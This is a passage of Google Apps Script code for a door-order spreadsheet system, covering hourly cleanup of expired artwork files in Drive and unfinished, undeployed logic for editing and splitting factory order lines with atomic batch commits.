    checked++;
  }
  return checked;
}
function artworkPreflight(){
  var ss=SpreadsheetApp.getActiveSpreadsheet();if(!ss)throw new Error('Open the bound spreadsheet project');
  var specs=[[SHEET_ORDERS,HEAD_ORDERS,25],[SHEET_ITEMS,HEAD_ITEMS,22]],result={spreadsheetUrl:ss.getUrl(),sheets:[]};
  for(var i=0;i<specs.length;i++){
    var spec=specs[i],sh=ss.getSheetByName(spec[0]);if(!sh)throw new Error('Required order sheet missing');
    var last=sh.getLastColumn(),head=sh.getRange(1,1,1,Math.max(last,spec[2])).getValues()[0];
    var legacy=artLegacyHeaderSpan_(spec[0],head);
    for(var c=0;c<head.length;c++){
      var knownLegacy=legacy&&c>=legacy.first&&c<legacy.last;
      if(c<spec[2]&&String(head[c])!==String(spec[1][c])&&!knownLegacy)throw new Error('Existing header mismatch: '+spec[0]+' column '+(c+1));
      if(c>=spec[2]&&head[c]&&String(head[c])!==String(spec[1][c]||''))throw new Error('Unexpected occupied column: '+spec[0]+' column '+(c+1));
    }
    var checked=legacy?artValidateLegacyRows_(spec[0],sh):0;
    result.sheets.push({name:spec[0],columns:last,rows:Math.max(0,sh.getLastRow()-1),headers:head,legacyLabels:!!legacy,legacyRowsChecked:checked});
  }
  Logger.log(JSON.stringify(result));return result;
}
function configureArtworkRetention(){
  artworkPreflight(); // Validation precedes schema, folder and trigger changes.
  var ss=SpreadsheetApp.getActiveSpreadsheet(),props=PropertiesService.getScriptProperties();
  props.setProperty('ART_SPREADSHEET_ID',ss.getId());
  // The existing Orders grid ends at Z. Add only the trailing capacity needed
  // for the approved new fields; leave every original column/cell in place.
  var specs=[[SHEET_ORDERS,HEAD_ORDERS],[SHEET_ITEMS,HEAD_ITEMS]];
  for(var si=0;si<specs.length;si++){
    var target=ss.getSheetByName(specs[si][0]),max=target.getMaxColumns();
    if(max<specs[si][1].length)target.insertColumnsAfter(max,specs[si][1].length-max);
  }
  sheet_(SHEET_ORDERS,HEAD_ORDERS);sheet_(SHEET_ITEMS,HEAD_ITEMS);
  var folder=artPrivateFolder_();
  var canary=folder.createFile(Utilities.newBlob('Artwork setup check','text/plain','WPC_ART_SETUP_VERIFY'));
  canary.setDescription('WPC_ART_SETUP_V1');
  artPermanentlyRemove_(canary.getId(),'WPC_ART_SETUP_VERIFY','WPC_ART_SETUP_V1',folder.getId());
  var triggers=ScriptApp.getProjectTriggers(),hourly=0,edit=0;
  for(var i=0;i<triggers.length;i++){
    if(triggers[i].getHandlerFunction()==='cleanupOrderArtwork')hourly++;
    if(triggers[i].getHandlerFunction()==='artworkStatusEdited')edit++;
  }
  if(hourly>1||edit>1)throw new Error('Duplicate artwork triggers need review');
  if(!hourly)ScriptApp.newTrigger('cleanupOrderArtwork').timeBased().everyHours(1).create();
  if(!edit)ScriptApp.newTrigger('artworkStatusEdited').forSpreadsheet(ss).onEdit().create();
  props.setProperty('ART_RETENTION_POLICY','READY_72H_PERMANENT_V1');
  Logger.log(JSON.stringify({ok:true,policy:'Ready + 72 hours, hourly permanent cleanup',privateFolderId:folder.getId(),spreadsheetUrl:ss.getUrl(),hourlyTrigger:true,statusEditTrigger:true}));
}
function artDriveRequest_(id,method){
  var url='https://www.googleapis.com/drive/v3/files/'+encodeURIComponent(id);
  if(method==='get')url+='?fields=id,name,mimeType,parents,ownedByMe,description,trashed';
  return UrlFetchApp.fetch(url,{method:method,headers:{Authorization:'Bearer '+ScriptApp.getOAuthToken()},muteHttpExceptions:true});
}
function artPermanentlyRemove_(id,name,description,folderId){
  var res=artDriveRequest_(id,'get'),code=res.getResponseCode();
  if(code===404)return; // Idempotent recovery after a partially completed cleanup.
  if(code!==200)throw new Error('Artwork metadata check failed ('+code+')');
  var m=JSON.parse(res.getContentText());
  if(!m.ownedByMe||m.mimeType==='application/vnd.google-apps.folder'||m.name!==name||m.description!==description||!Array.isArray(m.parents)||m.parents.length!==1||m.parents[0]!==folderId)throw new Error('Artwork deletion scope check failed');
  var del=artDriveRequest_(id,'delete'),dc=del.getResponseCode();
  if(dc!==200&&dc!==204&&dc!==404)throw new Error('Artwork permanent deletion failed ('+dc+')');
}
function cleanupOrderArtwork(){
  var props=PropertiesService.getScriptProperties();
  if(props.getProperty('ART_RETENTION_POLICY')!=='READY_72H_PERMANENT_V1')throw new Error('Artwork retention is not configured');
  var lock=LockService.getScriptLock();lock.waitLock(20000);
  var started=Date.now(),seen=0,deleted=0,failures=0,cursor='',iterator;
  try{
    var folder=artPrivateFolder_(),folderId=folder.getId(),token=props.getProperty('ART_CLEANUP_CURSOR');
    try{iterator=token?DriveApp.continueFileIterator(token):folder.getFiles();}catch(ex){iterator=folder.getFiles();}
    while(iterator.hasNext()&&seen<30&&Date.now()-started<240000){
      var registry=iterator.next(),name=registry.getName();
      if(!/^registry_[A-Za-z0-9_-]{1,60}_pa_[a-f0-9]{32}\.json$/.test(name))continue;
      seen++;
      try{
        var blob=registry.getBlob();if(blob.getBytes().length>8192)throw new Error('Invalid artwork registry size');
        var row=JSON.parse(blob.getDataAsString('UTF-8'));
        if(!Array.isArray(row)||!artOrderValid_(row[0])||!artRefValid_(row[1])||name!==artRegistryName_(row[0],row[1])||!artDateMs_(row[7]))throw new Error('Invalid artwork registry association');
        var state=artState_(row[0]),linked=artLinked_(row[0],row[1]);
        var expired=state.purged||state.completed&&Date.now()>=state.completed+ART_KEEP_MS_;
        var orphan=!linked&&Date.now()>=Number(row[7])+ART_ORPHAN_MS_;
        if(!expired&&!orphan)continue;
        var binding='WPC_ART_V1|'+row[0]+'|'+row[1]+'|';
        // Originals/previews first, registry last. A failure leaves enough state to retry.
        artPermanentlyRemove_(String(row[2]),row[1],binding+'original',folderId);
        artPermanentlyRemove_(String(row[3]),row[1]+'_preview',binding+'preview',folderId);
        if(expired&&state.row>=2&&!state.purged)state.sheet.getRange(state.row,COL_ART_PURGED).setValue(new Date());
        artPermanentlyRemove_(registry.getId(),name,binding+'registry',folderId);
        deleted++;
      }catch(err){failures++;} // Do not log image credentials, file IDs or file contents.
    }
    if(iterator.hasNext())cursor=iterator.getContinuationToken();
    props.setProperty('ART_CLEANUP_CURSOR',cursor);
    props.setProperty('ART_CLEANUP_LAST_RUN',String(Date.now()));
    props.setProperty('ART_CLEANUP_LAST_RESULT',JSON.stringify({checked:seen,deleted:deleted,failures:failures,more:!!cursor}));
    if(failures)throw new Error('Artwork cleanup needs review: '+failures+' record(s) failed; protected records remain for retry');
    return {ok:true,checked:seen,deleted:deleted,more:!!cursor};
  }finally{lock.releaseLock();}
}


// PRIVATE CANDIDATE, NOT DEPLOYED. Protect existing and partially written IDs
// across every legacy newOrder path. No trusted booleans from request payloads.
function assertLegacyCreate294_(id){
 if(!LockService.getScriptLock().hasLock())throw Error('WRITE_LOCK_REQUIRED');
 var ss=SpreadsheetApp.getActiveSpreadsheet();
 var o=ss.getSheetByName(SHEET_ORDERS),i=ss.getSheetByName(SHEET_ITEMS);
 if(o&&findRow_(o,String(id))>0)throw Error('EXISTING_ORDER_READ_ONLY');
 if(i&&itemRowsFor_(i,String(id)).rows.length)throw Error('ORPHAN_ORDER_REQUIRES_REVIEW');
 var completed=ss.getSheetByName('Create_Receipts_V294');if(completed&&completed.getLastRow()>1&&completed.getRange(2,1,completed.getLastRow()-1,1).getValues().some(function(r){return String(r[0])===String(id);}))throw Error('COMPLETED_CREATE_REVIEW_ONLY');
 var l=ss.getSheetByName('Create_Intents_V1');
 if(l&&l.getLastRow()>1){var rows=l.getRange(2,1,l.getLastRow()-1,1).getValues();if(rows.some(function(r){return String(r[0])===String(id);}))throw Error('CLAIMED_ORDER_REQUIRES_RECEIPT');}
}

/* Match current custom item storage: size text WxH cm(custom), blank W and H0.
 * Standard item storage: width field, height field and width-only size text.
 */
function dimensionView294_(row){
 var custom=/\(custom\)/i.test(String(row[6])),match=String(row[6]).match(/^\s*(\d+(?:\.\d+)?)\s*x\s*(\d+(?:\.\d+)?)\s*cm\s*\(custom\)\s*$/i);
 if(custom&&!match)throw Error('CUSTOM_SIZE_FORMAT_REVIEW');
 return {sizeMode:custom?'custom':'standard',w:custom?Number(match[1]):Number(row[17])||0,doorHeight:custom?Number(match[2]):Number(row[19])||215};
}
function dimensionTarget294_(row,fields){
 var has=function(k){return Object.prototype.hasOwnProperty.call(fields,k);};
 if(!has('w')&&!has('doorHeight')&&!has('sizeMode'))return row.slice();
 var base=dimensionView294_(row),mode=has('sizeMode')?String(fields.sizeMode):base.sizeMode,w=has('w')?Number(fields.w):base.w,h=has('doorHeight')?Number(fields.doorHeight):base.doorHeight;
 if(['standard','custom'].indexOf(mode)<0||!isFinite(w)||!isFinite(h)||w<=0||h<=0||w>1000||h>1000)throw Error('INVALID_DIMENSION');
 var next=row.slice();
 if(mode==='custom'){next[6]=w+'x'+h+' cm (custom)';next[17]='';next[19]=0;}
 else {if([70,80,90,100].indexOf(w)<0)throw Error('CHOOSE_CUSTOM_SIZE');next[6]=w+' cm';next[17]=w;next[19]=h;}
 return next;
}
function sizeLabel294_(row){var d=dimensionView294_(row);return d.sizeMode==='custom'?d.w+'×'+d.doorHeight+' سم (مقاس خاص — مقاس الفتحة المعمارية)':d.w+' سم'+(d.doorHeight?' (ارتفاع '+d.doorHeight+' سم)':'');}

/* Private server-side plan builder for v206 layout. Not deployed or enabled.
 * Authorization, snapshot and lock are checked by prepareFactoryEdit294_.
 * Only existing Door lines. No new products, pricing, artwork, qty or deletion.
 */
function buildFactoryEditPlan294_(b,changes,env){
 var rows=b.items.map(function(x){return x.slice();}),stockDelta={},patches=[],seen={},appends=[],splits={};
 changes.forEach(function(ch){
  var idx=Number(ch.index),old=b.items[idx];
  if(!Number.isInteger(idx)||idx<0||!old||seen[idx])throw Error('INVALID_ITEM');seen[idx]=true;
  if(String(old[3])!=='Door')throw Error('DOOR_ONLY');
  if(env.hash(old)!==ch.expectedHash)throw Error('STALE_ITEM');
  var original=old,split=false,originalQty=Number(old[10])||0,produced=Number(old[18])||0;
  var dimensionNext=dimensionTarget294_(old,ch.fields);
  var wantsSpec=Object.keys(ch.fields).some(function(k){return k==='sizeMode'?String(old[6])!==String(dimensionNext[6]):k!=='note'&&String(ch.fields[k])!==String(old[({w:17,doorHeight:19,frame:14,frameHeight:16,dbror:15,millEn:8,printArt:22,engraveArt:23})[k]]);});
  if(wantsSpec&&produced>0){
   if(!Number.isInteger(originalQty)||!Number.isInteger(produced)||!isFinite(Number(old[11]))||!isFinite(Number(old[12])))throw Error('SPLIT_DATA_REVIEW_REQUIRED');
   if(produced>=originalQty)throw Error('NO_UNPRODUCED_QUANTITY');
   assertSplitServices294_(b,idx,ch.serviceAllocation||{});
   split=true;old=original.slice();old[10]=originalQty-produced;old[18]=0;old[12]=Math.round((Number(original[12])-Math.round(Number(old[11])*produced*100)/100)*100)/100;rows[idx]=old.slice();
  }
  var next=rows[idx],allowed={note:21,w:17,doorHeight:19,frame:14,frameHeight:16,dbror:15,millEn:8,printArt:22,engraveArt:23};
  Object.keys(ch.fields).forEach(function(k){
   if(k==='sizeMode'||k==='w'||k==='doorHeight')return;
   if(!Object.prototype.hasOwnProperty.call(allowed,k))throw Error('UNAPPROVED_FIELD');
   var v=ch.fields[k];
   if(k==='printArt'||k==='engraveArt'){if(!env.artworkAllowed||!env.artworkAllowed(idx,k,String(v)))throw Error('ART_STAGE_NOT_APPROVED');}
   if(['w','doorHeight','frameHeight','frame'].indexOf(k)>=0){v=Number(v);if(!isFinite(v)||v<0||(['w','doorHeight'].indexOf(k)>=0&&v<=0))throw Error('INVALID_DIMENSION');}
   else {v=String(v);if(v.length>1000)throw Error('INVALID_TEXT');}
   if(k==='frame'&&[0,10,15,20].indexOf(v)<0)throw Error('INVALID_FRAME');
   if(k!=='note'&&Number(old[18])>0&&String(old[allowed[k]])!==String(v))throw Error('PRODUCED_PART_DECISION_REQUIRED');
   next[allowed[k]]=v;
  });
  next[6]=dimensionNext[6];next[17]=dimensionNext[17];next[19]=dimensionNext[19];
  if(doorRowNeedsCut_(old[6],old[19])!==doorRowNeedsCut_(next[6],next[19])&&!env.cutApproved)throw Error('SERVICE_RECONCILIATION_REQUIRED');
  if(['frame','frameHeight','dbror'].some(function(k){return Object.prototype.hasOwnProperty.call(ch.fields,k);}))next[7]=[(next[14]?next[14]+' cm frame'+(next[16]?' (h:'+next[16]+'cm)':''):''),(next[15]?'bror '+next[15]:'')].filter(Boolean).join(' + ')+((next[14]||next[15])?' (included, no charge)':'');
  if(String(old[17])!==String(next[17])&&b.status!=='Delivered'&&b.status!=='Cancelled'){
   var code=env.doorCode(old[5]),q=Number(old[10])||0;
   if(String(old[17]||'').trim())stockDelta[code+'|'+String(old[17])]=(stockDelta[code+'|'+String(old[17])]||0)+q;
   if(String(next[17]||'').trim())stockDelta[code+'|'+String(next[17])]=(stockDelta[code+'|'+String(next[17])]||0)-q;
  }
  if(split){
   var made=original.slice();made[10]=produced;made[12]=Math.round(Number(made[11])*produced*100)/100;
   patches.push({role:'item',sheetId:b.itemSheetId,rowIndex:b.itemRowIndices[idx],before:original.slice(),after:made,allowedColumns:[10,12]});
   splits[idx]={made:made,remainder:next,allocation:ch.serviceAllocation||{}};appends.push({sheetId:b.itemSheetId,row:next.slice()});rows[idx]=made;rows.push(next.slice());
  }else patches.push({role:'item',sheetId:b.itemSheetId,rowIndex:b.itemRowIndices[idx],before:old.slice(),after:next,allowedColumns:[6,7,8,14,15,16,17,19,21,22,23],artworkValidated:!!(ch.fields.printArt||ch.fields.engraveArt)});
 });
 // Services carry group-level size, not a Door line identifier. Migrate only
 // when every door of the old key moves together to one unchanged-cut key.
 // Partial allocations remain ambiguous and are rejected, never guessed.
 var key=function(r){return String(r[6])+'|'+(Number(r[19])||'');};
 b.items.forEach(function(service,si){
  if(['CUT','WOOD','PRINT'].indexOf(String(service[5]))<0)return;
  if(env.cutApproved&&String(service[5])==='CUT'&&env.cutServiceIndex===si)return;
  var serviceIdentity=service;
  if(!Number(service[19])&&String(service[6]||'')){
   // Version62 omitted WOOD/PRINT height cells. Recover only an exact title
   // suffix matching one unambiguous door-size group, never width alone.
   var titleMatch=String(service[4]).match(/^.*?\s[—-]\s(.*)$/),candidates={};
   if(titleMatch)b.items.forEach(function(r){
    if(String(r[3])!=='Door'||String(r[6])!==String(service[6]))return;
    var expected=sizeLabel294_(r);
    if(titleMatch[1]===expected)candidates[key(r)]=r;
   });
   var found=Object.keys(candidates);if(found.length===1){serviceIdentity=service.slice();serviceIdentity[19]=candidates[found[0]][19];}
  }
  var sk=key(serviceIdentity),members=[];b.items.forEach(function(r,i){if(String(r[3])==='Door'&&key(r)===sk)members.push(i);});
  if(!members.length&&b.items.some(function(r,i){return String(r[3])==='Door'&&key(rows[i])!==key(r);}))throw Error('SERVICE_RECONCILIATION_REQUIRED');
  var splitMembers=members.filter(function(i){return !!splits[i];});
  if(splitMembers.length){
   if(members.length!==1||splitMembers.length!==1||Number(service[18])>0)throw Error('SPLIT_SERVICE_RECONCILIATION_REQUIRED');
   var split=splits[members[0]],madeService=service.slice(),restService=service.slice();
   var serviceRemainder=Number(service[10])===Number(b.items[members[0]][10])?split.remainder[10]:Number(split.allocation[si]);
   if(!Number.isInteger(serviceRemainder)||serviceRemainder<0||serviceRemainder>Number(split.remainder[10])||Number(service[10])-serviceRemainder>Number(split.made[10])||serviceRemainder>Number(service[10]))throw Error('SERVICE_ALLOCATION_REQUIRED');
   madeService[10]=Number(service[10])-serviceRemainder;madeService[12]=Math.round(Number(service[11])*madeService[10]*100)/100;
   restService[10]=serviceRemainder;restService[12]=Math.round((Number(service[12])-madeService[12])*100)/100;restService[6]=split.remainder[6];restService[18]=0;
   var splitPrefix=String(service[4]).match(/^(.*?\s[—-]\s)/);if(!splitPrefix)throw Error('SERVICE_TITLE_REVIEW_REQUIRED');
   restService[4]=splitPrefix[1]+sizeLabel294_(split.remainder);
   if(String(service[5])==='CUT')restService[19]=split.remainder[19];
   patches.push({role:'item',sheetId:b.itemSheetId,rowIndex:b.itemRowIndices[si],before:service.slice(),after:madeService,allowedColumns:[10,12]});
   if(serviceRemainder>0)appends.push({sheetId:b.itemSheetId,row:restService,serviceSplit:true});rows[si]=madeService;rows.push(restService);return;
  }
  var anyChanged=members.some(function(i){return key(rows[i])!==key(b.items[i]);});
  if(!anyChanged){
   if(!String(service[6]||'')&&b.items.some(function(r,i){return String(r[3])==='Door'&&key(rows[i])!==key(r);}))throw Error('SERVICE_RECONCILIATION_REQUIRED');
   return;
  }
  var destinations={};members.forEach(function(i){destinations[key(rows[i])]=true;});
  if(Object.keys(destinations).length!==1||Object.keys(destinations)[0]===sk)throw Error('SERVICE_RECONCILIATION_REQUIRED');
  if(Number(service[18])>0)throw Error('SERVICE_PRODUCTION_REVIEW_REQUIRED');
  var target=rows[members[0]],oldQty=members.reduce(function(n,i){return n+(Number(b.items[i][10])||0);},0);
  if((Number(service[10])||0)>oldQty)throw Error('SERVICE_QTY_REVIEW_REQUIRED');
  // Joining a different existing size group would merge optional selections.
  if(b.items.some(function(r,i){return String(r[3])==='Door'&&members.indexOf(i)<0&&key(r)===key(target);}))throw Error('SERVICE_RECONCILIATION_REQUIRED');
  var after=service.slice();after[6]=target[6];
  var title=String(service[4]),prefix=title.match(/^(.*?\s[—-]\s)/);
  if(!prefix)throw Error('SERVICE_TITLE_REVIEW_REQUIRED');
  dimensionView294_(target);
  after[4]=prefix[1]+sizeLabel294_(target);
  if(String(service[5])==='CUT')after[19]=target[19];
  rows[si]=after;
  patches.push({role:'item',sheetId:b.itemSheetId,rowIndex:b.itemRowIndices[si],before:service.slice(),after:after,allowedColumns:[4,6,19]});
 });
 var consumed={};
 b.stock.forEach(function(r,i){
  var key=env.doorCode(r[0])+'|'+String(r[1]).trim();
  if(!stockDelta[key]||consumed[key])return;consumed[key]=true;
  var after=r.slice();after[2]=(Number(r[2])||0)+stockDelta[key];
  patches.push({role:'stock',sheetId:b.stockSheetId,rowIndex:b.stockRowIndices[i],before:r.slice(),after:after,allowedColumns:[2]});
 });
 return {rows:patches,appends:appends,projectedItems:rows,untrackedStockKeys:Object.keys(stockDelta).filter(function(k){return stockDelta[k]&&!consumed[k];})};
}
function prepareFactoryEdit294_(request,env){
 if(!env.hasLock())throw Error('WRITE_LOCK_REQUIRED');
 if(!env.authorized(request))throw Error('ADMIN_REQUIRED');
 var before=env.readOrder(request.id);
 if(!before||env.hash(before)!==request.expectedOrderHash)throw Error('ORDER_CHANGED');
 var plan=buildFactoryEditPlan294_(before,request.changes,env);
 plan.opId=request.opId;plan.digest=env.hash({before:before,changes:request.changes});
 return plan;
}

function assertSplitServices294_(b,index,allocation){
 allocation=allocation||{};
 var door=b.items[index],key=String(door[6])+'|'+(Number(door[19])||'');
 b.items.forEach(function(r){
  if(['CUT','WOOD','PRINT'].indexOf(String(r[5]))<0)return;
  if(String(r[6])!==String(door[6]))throw Error('SPLIT_SERVICE_RECONCILIATION_REQUIRED');
  var height=Number(r[19])||0;
  if(!height){var match=String(r[4]).match(/^.*?\s[—-]\s(.*)$/),expected=sizeLabel294_(door);if(!match||match[1]!==expected)throw Error('SPLIT_SERVICE_RECONCILIATION_REQUIRED');height=Number(door[19])||0;}
  if(String(r[6])+'|'+height!==key)throw Error('SPLIT_SERVICE_RECONCILIATION_REQUIRED');
  var members=b.items.filter(function(x){return String(x[3])==='Door'&&String(x[6])+'|'+(Number(x[19])||'')===key;});
  if(members.length!==1||Number(r[18])>0)throw Error('SPLIT_SERVICE_RECONCILIATION_REQUIRED');
  if(Number(r[10])!==Number(door[10])){var si=b.items.indexOf(r),q=Number(allocation[si]);if(!Object.prototype.hasOwnProperty.call(allocation,si)||!Number.isInteger(q)||q<0||q>Number(door[10])-Number(door[18])||q>Number(r[10])||Number(r[10])-q>Number(door[18]))throw Error('SERVICE_ALLOCATION_REQUIRED');}
 });return true;
}

/* PRIVATE EXECUTION CANDIDATE. Not deployed. Requires Sheets advanced service.
 * Caller builds a server-side plan under the script lock from freshly read rows.
 * Do not accept plan cell coordinates, prices, progress, or stock values from a browser.
 * Sheets batchUpdate commits cells + receipt atomically in one spreadsheet.
 * Drive image staging, notification and cleanup are excluded from this transaction.
 */
function executeEditBatch294_(plan,env){
 if(!env.hasLock())throw Error('WRITE_LOCK_REQUIRED');
 if(!plan||!plan.opId||!Array.isArray(plan.rows)||!plan.rows.length)throw Error('INVALID_PLAN');
 var prior=env.receipt(plan.opId);
 if(prior){if(prior.digest!==plan.digest)throw Error('OP_CONFLICT');return prior;}
 var requests=[],seen={};
 plan.rows.forEach(function(p){
  var key=p.sheetId+':'+p.rowIndex;
  if(seen[key])throw Error('DUPLICATE_TARGET');seen[key]=true;
  var live=env.readRow(p.sheetId,p.rowIndex);
  if(JSON.stringify(live)!==JSON.stringify(p.before))throw Error('ROW_CHANGED');
  if(p.before.length!==p.after.length)throw Error('SCHEMA_CHANGED');
  for(var c=0;c<p.before.length;c++){
   if(JSON.stringify(p.before[c])===JSON.stringify(p.after[c]))continue;
   if(p.allowedColumns.indexOf(c)<0)throw Error('PROTECTED_COLUMN');
   if(p.role==='item'&&([0,18].indexOf(c)>=0||([22,23].indexOf(c)>=0&&!p.artworkValidated)))throw Error('PROTECTED_ITEM_FIELD');
   var v=p.after[c],cell={};
   if(v!==''&&v!==null){
    if(typeof v==='number'){if(!isFinite(v))throw Error('INVALID_VALUE');cell.userEnteredValue={numberValue:v};}
    else if(typeof v==='boolean')cell.userEnteredValue={boolValue:v};
    else cell.userEnteredValue={stringValue:String(v)};
   }
   requests.push({updateCells:{range:{sheetId:p.sheetId,startRowIndex:p.rowIndex,endRowIndex:p.rowIndex+1,startColumnIndex:c,endColumnIndex:c+1},rows:[{values:[cell]}],fields:'userEnteredValue'}});
  }
 });
 (plan.appends||[]).forEach(function(a){
  if(!a.row||a.row.length<24||(a.serviceSplit?['CUT','WOOD','PRINT'].indexOf(String(a.row[5]))<0:String(a.row[3])!=='Door')||Number(a.row[18])!==0||!(Number(a.row[10])>0))throw Error('INVALID_SPLIT_APPEND');
  requests.push({appendCells:{sheetId:a.sheetId,rows:[{values:a.row.map(function(v){return v===''||v===null?{}:{userEnteredValue:typeof v==='number'?{numberValue:v}:typeof v==='boolean'?{boolValue:v}:{stringValue:String(v)}};})}],fields:'userEnteredValue'}});
 });
 if(!requests.length)throw Error('NO_CHANGES');
 var receipt={opId:plan.opId,digest:plan.digest,state:'COMPLETE'};
 requests.push(env.receiptAppendRequest(receipt));
 // This is the only mutation. A lost response is reconciled via receipt read, not
 // by resending a stock delta. All requests are one Sheets batch, no Drive writes.
 env.batch(requests);
 var stored=env.receipt(plan.opId);
 if(!stored||stored.digest!==plan.digest)throw Error('COMMIT_UNCONFIRMED_REVIEW_ONLY');
 return stored;
}
// Production adapter preparation, intentionally not wired into doGet/doPost.
function editBatchAdapter294_(bookId,receiptSheetId,readReceipt,readRow){
 return {
  hasLock:function(){return LockService.getScriptLock().hasLock();},
  receipt:readReceipt,readRow:readRow,
  receiptAppendRequest:function(r){return {appendCells:{sheetId:receiptSheetId,rows:[{values:[r.opId,r.digest,r.state].map(function(v){return {userEnteredValue:{stringValue:v}};})}],fields:'userEnteredValue'}};},
  batch:function(requests){return Sheets.Spreadsheets.batchUpdate({requests:requests},bookId);}
 };
}

/* Private Apps Script glue. Not deployed. Both snapshot and commit authenticate.
 * Requires a pre-created Factory_Edit_Receipts_V294 sheet in the same book.
 * Enabling is a separate user deployment decision, not performed by this file.
 */
var HEAD_FACTORY_RECEIPTS294_=['Operation','Digest','State'];
function factoryHash294_(x){return artHex_(Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256,JSON.stringify(x),Utilities.Charset.UTF_8));}
function factorySnapshot294_(id){
 var ss=SpreadsheetApp.getActiveSpreadsheet(),o=ss.getSheetByName(SHEET_ORDERS),i=ss.getSheetByName(SHEET_ITEMS),s=ss.getSheetByName(SHEET_STOCK);
 if(!o||!i||!s)throw Error('REQUIRED_SHEET_MISSING');
 [[SHEET_ORDERS,HEAD_ORDERS],[SHEET_ITEMS,HEAD_ITEMS],[SHEET_STOCK,HEAD_STOCK]].forEach(function(pair){try{schemaRead294_(ss,pair[0],pair[1]);}catch(e){throw Error('EDIT_SCHEMA_REVIEW_REQUIRED: '+String(e.message||e));}});
 var row=findRow_(o,id);if(row<2)throw Error('ORDER_NOT_FOUND');
 var order=o.getRange(row,1,1,o.getLastColumn()).getValues()[0];
 var got=itemRowsFor_(i,id),items=got.rowNums.map(function(r){return i.getRange(r,1,1,i.getLastColumn()).getValues()[0];});
 var stock=s.getLastRow()>1?s.getRange(2,1,s.getLastRow()-1,s.getLastColumn()).getValues():[];
 return {id:id,status:String(order[COL_STATUS-1]),summary:order,summaryRowIndex:row-1,summarySheetId:o.getSheetId(),items:items,itemRowIndices:got.rowNums.map(function(r){return r-1;}),itemSheetId:i.getSheetId(),stock:stock,stockSheetId:s.getSheetId(),stockRowIndices:stock.map(function(_,idx){return idx+1;})};
}
function factoryReceipt294_(sh,id){
 if(sh.getLastRow()<2)return null;
 var found=sh.getRange(2,1,sh.getLastRow()-1,3).getValues().filter(function(r){return String(r[0])===String(id);});
 if(found.length>1)throw Error('DUPLICATE_RECEIPT_REVIEW');
 return found.length?{opId:found[0][0],digest:found[0][1],state:found[0][2]}:null;
}
function handleFactoryEdit294_(e){
 if(!checkAdminPw_(e.parameter.pw,e.parameter.dev))return {ok:false,error:adminPwError_()};
 if(PropertiesService.getScriptProperties().getProperty('FACTORY_EDIT_294_ENABLED')!=='REVIEWED')return {ok:false,error:'مسار التعديل الآمن لم يُفعّل بعد'};
 var lock=LockService.getScriptLock();lock.waitLock(20000);
 try{
  var ss=SpreadsheetApp.getActiveSpreadsheet(),p=e.parameter;
  if(p.action==='factoryEditSnapshot294'){
   if(!artOrderValid_(p.id))throw Error('INVALID_ID');
   var b=factorySnapshot294_(p.id);
   return {ok:true,services:b.items.map(function(r,i){return {index:i,code:r[5],title:r[4],qty:Number(r[10])||0,price:Number(r[11])||0};}).filter(function(r){return isServiceCode_(r.code);}),hash:factoryHash294_(b),items:b.items.map(function(r){var dims=dimensionView294_(r);return {hash:factoryHash294_(r),sizeMode:dims.sizeMode,w:dims.w,doorHeight:dims.doorHeight,frame:r[14],frameHeight:r[16],dbror:r[15],millEn:r[8],note:r[21],printArt:r[22],engraveArt:r[23],produced:Number(r[18])||0};})};
  }
  var request=JSON.parse(String(p.request||'{}'));
  if(!artOrderValid_(request.id)||!/^edit294_[a-f0-9]{32}$/.test(String(request.opId||'')))throw Error('INVALID_REQUEST');
  var receiptSheet=ss.getSheetByName('Factory_Edit_Receipts_V294');if(!receiptSheet)throw Error('RECEIPT_SETUP_REQUIRED');
  var heads=receiptSheet.getRange(1,1,1,3).getValues()[0];if(JSON.stringify(heads)!==JSON.stringify(HEAD_FACTORY_RECEIPTS294_))throw Error('RECEIPT_SCHEMA_MISMATCH');
  var digest=factoryHash294_({id:request.id,base:request.expectedOrderHash,changes:request.changes,cutHistory:request.cutHistory||'',cutApproval:request.cutApproval||null});
  var prior=factoryReceipt294_(receiptSheet,request.opId);
  if(prior){if(prior.digest!==digest)throw Error('OP_CONFLICT');return {ok:true,receipt:prior};}
  if(p.action==='factoryEditReceipt294')return {ok:true,receipt:null};
  var env={hasLock:function(){return lock.hasLock();},authorized:function(){return true;},hash:factoryHash294_,doorCode:doorCode_,readOrder:factorySnapshot294_,artworkAllowed:function(index,field,ref){return assertArtStage294_(request,index,field,ref);}};
  var fresh=factorySnapshot294_(request.id),cutQuote=null;
  if(request.cutApproval){if(!Array.isArray(request.changes)||request.changes.length!==1)throw Error('CUT_SINGLE_ITEM_REVIEW_ONLY');cutQuote=cutReviewQuote294_(fresh,Number(request.changes[0].index),request.changes[0].fields,request.cutHistory||'',cutCurrentPrice294_());validateCutReview294_(cutQuote,request.cutApproval,factoryHash294_);env.cutApproved=true;env.cutServiceIndex=cutQuote.serviceIndex;}
  var plan=prepareFactoryEdit294_(request,env);if(cutQuote)applyCutQuotePlan294_(fresh,request,plan,cutQuote);plan.digest=digest;
  var adapter=editBatchAdapter294_(ss.getId(),receiptSheet.getSheetId(),function(id){return factoryReceipt294_(receiptSheet,id);},function(sheetId,rowIndex){var sheet=ss.getSheets().filter(function(x){return x.getSheetId()===sheetId;})[0];if(!sheet)throw Error('SHEET_CHANGED');return sheet.getRange(rowIndex+1,1,1,sheet.getLastColumn()).getValues()[0];});
  return {ok:true,receipt:executeEditBatch294_(plan,adapter)};
 }catch(err){return {ok:false,error:String(err.message||err)};}
 finally{lock.releaseLock();}
}
// Integration point in doGet, before legacy newOrder:
// if(action==='factoryEditSnapshot294'||action==='factoryEditCommit294')return reply(handleFactoryEdit294_(e),cb);
// No legacy cancelOrder/newOrder path is called by this handler.

/* PRIVATE create-only candidate. No legacy saveOrder_, deletes or notifications.
 * Caller owns script lock and schema validation. One Sheets batch includes
 * summary, all items, stock changes, receipt and display-number counter cell.
 */
function createRows294_(o,env){
 var when=o.ts?new Date(o.ts):new Date(),ds=Utilities.formatDate(when,TZ,'yyyy-MM-dd'),tm=Utilities.formatDate(when,TZ,'HH:mm'),qty=0,rods=0;
 (o.items||[]).forEach(function(it){if(isServiceCode_(it.code))return;var q=Number(it.qty)||0;if(it.kind==='frame'||it.kind==='bror')rods+=it.isSet?q*3:q;else qty+=q;});
 if(o.replacesId||o.displayNo||o.editCount)throw Error('NEW_ONLY_NO_REPLACEMENT');
 var due=cleanIsoDate_(o.dueDate)||addDaysIso_(ds,DUE_DEFAULT_DAYS_),no=env.nextDisplay;
